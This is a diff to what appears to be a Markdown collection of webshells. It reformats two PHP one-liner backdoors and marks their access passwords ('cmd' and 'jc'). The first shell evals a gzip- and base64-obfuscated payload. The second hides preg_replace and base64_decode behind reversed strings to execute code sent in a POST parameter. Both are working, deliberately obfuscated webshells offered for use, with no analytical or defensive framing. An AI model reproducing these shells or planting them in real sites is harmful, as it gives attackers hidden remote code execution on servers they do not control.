@@ -2,17 +2,17 @@
 # PHP:
 ```
 <?PHP
-eVal ( gzinFlate ( base64_dEcode ('Sy1LzNFQiQ/wDw6JVk/OTVGP1bQGAA==') ) );exit;?>    #cmd
-------------------------------------------------------------------------------------------------------------
-
+eVal ( gzinFlate ( base64_dEcode ('Sy1LzNFQiQ/wDw6JVk/OTVGP1bQGAA==') ) );exit;?>
+#密碼:cmd
+```
+```
 <?php
  $a=@strrev(ecalper_gerp); 
  $b=@strrev(edoced_46esab);  
  echo @$a($b(L3h4L2Ug),$_POST[jc],axxa);
 ?>
-
-#jc
-
+#密碼:jc
+```
 ------------------------------------------------------------------------------------------------------------
 # ASP:
 ```
